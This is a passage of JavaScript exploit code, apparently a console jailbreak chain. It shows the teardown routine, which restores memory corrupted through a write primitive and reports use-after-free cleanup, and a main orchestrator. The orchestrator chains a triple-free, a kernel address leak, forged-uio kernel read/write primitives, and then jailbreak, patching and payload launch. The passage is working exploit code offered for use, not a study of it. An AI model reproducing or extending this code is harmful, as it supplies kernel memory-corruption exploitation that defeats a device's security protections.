            mark("WORKERS-DISARMED", disarmed + "/" + workers.length
                + (disarmFailed ? " failed=" + disarmFailed + " ["
                    + disarmErrs.join(", ") + "]" : "")
                + " timeout_ms=" + DISARM_MS);
        for (const w of workers) {
            try {
                if (w.wired && w.master && w.origVector && p) {
                    p.write8(w.master.add32(0x10), w.origVector);
                    w.wired = false;
                }
            } catch (e) { }
        }
        for (const w of workers) { try { w.worker.terminate(); } catch (e) { } }
        try {
            if (mainArmed && mainMf && mainOrig && p) {
                p.write8(mainMf, mainOrig);
                mainArmed = false;
                mark("EXPM1-RESTORED", "expm1(1)=" + Math.expm1(1));
            }
        } catch (e) { mark("DISARM-THREW", e.message); }

        if (rebootRequired)
            mark(allDone ? "REBOOT-RECOMMENDED"
                : "REBOOT-REQUIRED", "reason=uaf-file-not-reclaimed"
                + (allDone ? " (payload already running; hygiene only)" : ""));
        mark("PROOF-SUMMARY-FINAL", "pass=" + checkCounts().passCount
            + " fail=" + checkCounts().failCount);
}

/*
MAIN ORCHESTRATOR.

This is the whole chain, named. Each line below is a stage defined above; the
order and the gates are exactly the order the old monolithic body ran them in,
so the observable behaviour -- marks, checks, return values, failure reasons --
is unchanged. Same shape as lapse-vue.js's lapse():

    setup() -> double_free_reqs2() -> leak_kernel_addrs()
    -> double_free_reqs1() -> make_kernel_arw() -> jailbreak
*/
async function runOriginal(options) {
    options = options || {};
    try {
        /* Stage 1: firmware, blobs, the primitive, the ROP gate. */
        if (!(await stagePrimitive(options))) {
            if (primitiveFail === "already-jailbroken")
                return { success: false, alreadyJailbroken: true,
                    reason: "console is already jailbroken" };
            return { success: false, reason: "unsupported firmware" };
        }

        /* Stages 2 + 3 + scanners: the worker pool, the thread attributes, and
           the reclaim scans the triple-free stage drives. */
        await stageWorkers();
        await stageThreadAttrs();
        makeScanners();

        /* Stage 5: the triple free. */
        await stageTripleFree();

        /* Stage 6: kernelBase. */
        await stageLeakKqueue();

        /* Stage 7: the forged-uio primitives. */
        makeKarwHelpers();

        /* Stage 8: kernel R/W, jailbreak, patch, payload. */
        await stageMakeKarw();

        return { success: allDone, rebootRequired };
    } catch (e) {
        mark("STEP10-FAILED", (e && e.message) ? e.message : String(e));
        state("FAILED -- see log", "bad");
        return { success: false, reason: "threw: "
            + ((e && e.message) ? e.message : String(e)) };
    } finally {
        try { await stageTeardown(); }
        catch (e) { mark("TEARDOWN-THREW", (e && e.message) ? e.message : String(e)); }
        stageReport();
    }
}
